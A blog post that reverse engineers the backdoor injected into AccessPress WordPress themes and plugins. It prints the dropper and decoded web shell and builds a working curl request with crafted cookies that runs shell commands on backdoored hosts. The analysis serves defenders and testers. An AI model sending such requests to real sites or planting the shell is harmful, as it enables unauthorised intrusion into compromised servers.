---
layout: post
title: "Reversing a WordPress Backdoor"
author: "dnstun0 (Jim Keeler)"
date: 2022-02-01 17:00:00 -0500
---
On January 18th, 2022, [Jetpack](https://jetpack.com/) [published](https://jetpack.com/2022/01/18/backdoor-found-in-themes-and-plugins-from-accesspress-themes/) their discovery of a supply chain attack affecting 93 WordPress themes and plugins. An organization called [AccessPress Themes](https://accesspressthemes.com/) had been breached in the first half of September 2021, and the extensions available for download on their site were injected with a backdoor.

There are published YARA rules and other [detection instructions](https://www.bleepingcomputer.com/news/security/over-90-wordpress-themes-plugins-backdoored-in-supply-chain-attack/) readily available for site owners to determine if they are vulnerable. But if you're a bug bounty hunter, penetration tester, or red teamer there's not much information on how to test for and exploit the backdoor. The rest of this article will cover how to reverse engineer the backdoor and use it to obtain a web shell on a vulnerable host.

## Dropper
First, we'll take a look at the dropper. The compromised extensions were modified to include a dropper function in the _initial.php_ file of the main plugin or theme directory. When run, it installs a web shell in _wp-includes/vars.php_.

```php
01  function makeInit() {
02     $b64 = 'ba' . 'se64' . '_dec' . 'ode';
03     $b = 'ZnVuY3Rpb2........TsKCg==';
04
05     $f = $_SERVER['DOCUMENT_ROOT'] . '/wp-includes/vars.php';
06     if(file_exists($f)) {
07         $fp = 0777 & @fileperms($f);
08         $ft = @filemtime($f);
09         $fc = @file_get_contents($f);
10         if(strpos($fc, 'wp_is_mobile_fix') === false) {
11             $fc = str_replace('function wp_is_mobile()',
12                $b64($b) . 'function wp_is_mobile()',
13                $fc);
14            @file_put_contents($f, $fc);
15            @touch($f, $ft);
16            @chmod($f, $fp);
17        }
18        return true;
19    }
20    return false;
21  }
```

Line two shows fragments of the `base64_decode` function name being concatenated together; probably to obfuscate its intent from any scanners. The actual web shell code is on line three, and is base64 encoded. The rest of the dropper checks for the existence of the _vars.php_ file, sets its permissions wide open, inserts the backdoor, and then puts the file timestamp and permissions back the way they were.

## Backdoor Web Shell
What did that dropper install? Decoding the base64 string reveals the following PHP code.
```php
01  function wp_is_mobile_fix() {
02      $is_wp_mobile = ($_SERVER['HTTP_USER_AGENT'] == 'wp_is_mobile');
03      $g = $_COOKIE;
04
05    (count($g) == 8 && $is_wp_mobile) ?
06    (($qr = $g[33].$g[32]) && ($iv = $qr($g[78].$g[18])) &&
07    ($_iv = $qr($g[12].$g[17])) && ($_iv = @$iv($g[10], $_iv($qr($g[53])))) && 
08    @$_iv()) : $g;
09
10    return $is_wp_mobile;
11  }
12
13  wp_is_mobile_fix();
```

A quick glance tells us that using the backdoor will require a user agent string of `wp_is_mobile` and a cookie with eight values. Our final `curl` command will look something like this:
```console
$ curl -v -A "wp_is_mobile" --cookie "33=; 32=; 78=; 18=; 12=; 17=; 10=; 53=" http://localhost/wp-includes/vars.php
```
Now comes the challenging part: de-obfuscating that mess on lines five through eight and filling in the cookie values.

## Reverse Engineering the Web Shell

That question mark is a [ternary operator](https://www.php.net/manual/en/language.operators.comparison.php); which is essentially a shortened if-else statement. If we re-examine and rewrite it as pseudo-code it makes things a little easier to understand:
> IF there are eight cookie values AND the user agent is an expected value
> THEN perform a series of statements and return their value
> ELSE return the cookie array

Since the result of this statement isn't being stored or used, whatever the return value is doesn't matter; and since the "else" just returns the cookie array, we can completely ignore that part of the statement. That leaves us with the comparison and the true condition. As mentioned before, to execute the series of statements we need eight cookie values and a user agent string of `wp_is_mobile`. That will cause the chain of statements in the true condition to execute. Let's examine those now.

```php
(($qr = $g[33].$g[32]) && ($iv = $qr($g[78].$g[18])) && ($_iv = $qr($g[12].$g[17])) && ($_iv = @$iv($g[10], $_iv($qr($g[53])))) && @$_iv())
```

As you can see, there are several statements chained together with double ampersands. This is a [short-circuit evaluation](https://en.wikipedia.org/wiki/Short-circuit_evaluation), which means each statement will execute in sequence until one fails. This is an easy way to perform multiple actions in a single statement. To improve readability, we'll rewrite these as separate statements.

```php
$qr = $g[33].$g[32];
$iv = $qr($g[78].$g[18]);
$_iv = $qr($g[12].$g[17]);
$_iv = @$iv($g[10], $_iv($qr($g[53])));
@$_iv();
```

We can further reduce the complexity by removing some more of the obfuscation. The shell seems to be avoiding possible WAF rules by splitting its input across pairs of parameters that are then concatenated back together. Let's remove half of each pair and assume we'll be passing an empty string for the removed half. (e.g. `"str"."ing"` becomes `"string".""`)

```php
01  $qr = $g[33];
02  $iv = $qr($g[78]);
03  $_iv = $qr($g[12]);
04  $_iv = @$iv($g[10], $_iv($qr($g[53])));
05  @$_iv();
```

We've now reduced the code to a point where we need to start interpreting the logic. It appears that the cookie values are being used to construct function name strings. PHP allows you to use a variable as a function name, and when followed by parentheses and arguments, will attempt to look up the function and execute it. That's exactly what this code is doing; we just need to guess what functions are being called to create a web shell.

The logic here is a bit tricky to describe, so here goes nothing. First, a function name is read from the cookie into `qr`. That function is then used to generate another function name from a cookie value and store it in `iv`. We do this again a third time with a different cookie value and store the result in `_iv`. Finally, we use the remaining two cookie values and the three computed function names to generate a final function name. That final function is then executed with no parameters.

What are these functions being specified in the cookie values? How do they work together to create a reverse shell? It would be _great_ if we had some logs of an active attack so we could see the payloads used...but we don't. So let's see if we can figure it out ourselves.

I assumed the shell author needed three things: support for special characters ([`base64_decode`](https://www.php.net/manual/en/function.base64-decode.php)), execution of shell commands ([`shell_exec`](https://www.php.net/manual/en/function.shell-exec.php)), and printing the command output ([`echo`](https://www.php.net/manual/en/function.echo)). There was one problem with my assumptions: the functions for those three things all use one parameter. On line four above, you can see the `iv` function takes two.

After scouring the PHP documentation, I came across the [`create_function`](https://www.php.net/manual/en/function.create-function.php) function. There's a big warning in the documentation that it's been deprecated as of PHP 7.2.0, but it seemed to work on my local 7.4 version so I gave it a shot anyway. The `create_function` function takes two arguments: a string of arguments, and a string of PHP code. It then creates an anonymous (lambda-style) function that can be executed.

Now that we have a set of functions to work with that fit the required number of parameters, let's see which ones we can overlay on the web shell code so it makes sense.

```php
01  $qr = "base64_decode";
02  $iv = $qr(base64_encode("create_function"));
03  $_iv = $qr(base64_encode("base64_decode"));
04  $_iv = @$iv($g[10], $_iv($qr($g[53])));
05  @$_iv();
```

If we assume the cookie value `$g[33]` will be the string `base64_decode`, the values for `$iv` and `$_iv` will need to be base64 encoded so they decode to valid function names. Let's rewrite line four and replace the variable names with their actual values.

> If you're wondering why there's an @ symbol in front of `$_iv`, it instructs PHP to suppress errors. Which, if you're an attacker, you'd like to keep hidden from your target.

```php
$_iv = @create_function($g[10], base64_decode(base64_decode($g[53])));
```

The variable `$_iv` is reused here. We set it to `base64_decode` on line three. It is used in line four to compute a new value for itself. And then that computed value is called on line five.

We've almost got it! We just need to fill in those `create_function` arguments with cookie values that fit our algorithm.

```php
$_iv = @create_function("", base64_decode(base64_decode("WldOb2J5QnphR1ZzYkY5bGVHVmpLQ2R3ZDJRbktUcz0=")));
```

An empty string indicating no parameters and a double encoded string will do it. The double encoded string can be any PHP code you want to execute. In this example, I'm printing the current working directory.

```php
echo shell_exec('pwd');
```

Let's go back to our separate statement rewrite of the original code and decorate it with the cookie values we've planned out. This should help illustrate the final HTTP request we need to send.

```php
//    "base64_decode" . ""
$qr = $g[33]          . $g[32];

//        b64("create_function") . ""
$iv = $qr($g[78]                 . $g[18]);

//         b64("base64_decode") . ""
$_iv = $qr($g[12]               . $g[17]);

//          ""               b64(b64("your PHP payload"))
$_iv = @$iv($g[10], $_iv($qr($g[53])));

@$_iv();
```

This makes writing a `curl` command much easier.

```console
curl -v -A "wp_is_mobile" --cookie "33=base64_decode; 32=; 78=Y3JlYXRlX2Z1bmN0aW9u; 18=; 12=YmFzZTY0X2RlY29kZQ==; 17=; 10=; 53=WldOb2J5QnphR1ZzYkY5bGVHVmpLQ2R3ZDJRbktUcz0=" http://localhost:8000/wp-includes/vars.php --output -
```

## Hack Yourself
Running a test on your local system is quite simple; especially with the addition of a [built-in web server](http://www.php.net/manual/en/features.commandline.webserver.php) in PHP versions 5.4 and later.

First, create a simple PHP file called _index.php_ containing the backdoor web shell.
```php
<?php
function wp_is_mobile_fix() {
    $is_wp_mobile = ($_SERVER['HTTP_USER_AGENT'] == 'wp_is_mobile');
    $g = $_COOKIE;

  (count($g) == 8 && $is_wp_mobile) ?
  (($qr = $g[33].$g[32]) && ($iv = $qr($g[78].$g[18])) &&
  ($_iv = $qr($g[12].$g[17])) && ($_iv = @$iv($g[10], $_iv($qr($g[53])))) && 
  @$_iv()) : $g;

  return $is_wp_mobile;
}

wp_is_mobile_fix();
?>
```

Then start a simple PHP web server from the command line.

```console
$ cd path/to/index.php
$ php -S 127.0.0.1:8000
```

Use `curl` to send your payload with the correct user agent string and cookie values.

```console
curl -v -A "wp_is_mobile" --cookie "33=base64_decode; 32=; 78=Y3JlYXRlX2Z1bmN0aW9u; 18=; 12=YmFzZTY0X2RlY29kZQ==; 17=; 10=; 53=WldOb2J5QnphR1ZzYkY5bGVHVmpLQ2R3ZDJRbktUcz0=" http://localhost:8000/index.php --output -
```

You should see the current working directory of your _index.php_ script in the output.

```console
$ curl -v -A "wp_is_mobile" --cookie "33=base64_decode; 32=; 78=Y3JlYXRlX2Z1bmN0aW9u; 18=; 12=YmFzZTY0X2RlY29kZQ==; 17=; 10=; 53=WldOb2J5QnphR1ZzYkY5bGVHVmpLQ2R3ZDJRbktUcz0=" http://localhost:8000/index.php --output -
*   Trying ::1:8000...
* connect to ::1 port 8000 failed: Connection refused
*   Trying 127.0.0.1:8000...
* Connected to localhost (127.0.0.1) port 8000 (#0)
> GET /index.php HTTP/1.1
> Host: localhost:8000
> User-Agent: wp_is_mobile
> Accept: */*
> Cookie: 33=base64_decode; 32=; 78=Y3JlYXRlX2Z1bmN0aW9u; 18=; 12=YmFzZTY0X2RlY29kZQ==; 17=; 10=; 53=WldOb2J5QnphR1ZzYkY5bGVHVmpLQ2R3ZDJRbktUcz0=
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Host: localhost:8000
< Date: Wed, 26 Jan 2022 16:07:00 GMT
< Connection: close
< X-Powered-By: PHP/7.4.25
< Content-type: text/html; charset=UTF-8
< 
/tmp
* Closing connection 0

$ 
```

More public information on the vulnerability can be found with the associated CVE: [CVE-2021-24867](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24867).